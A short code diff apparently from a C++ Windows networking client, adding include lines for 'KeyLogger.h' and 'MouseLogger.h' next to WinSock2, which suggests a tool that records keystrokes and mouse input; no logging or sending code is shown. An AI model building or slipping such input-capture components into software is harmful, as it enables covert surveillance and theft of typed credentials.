@@ -3,6 +3,10 @@
 #include <WinSock2.h>
 #include <Windows.h>
 #include <string>
+#include "KeyLogger.h"
+#include "MouseLogger.h"
+#include <exception>
+#include <iostream>
 
 class Client
 {
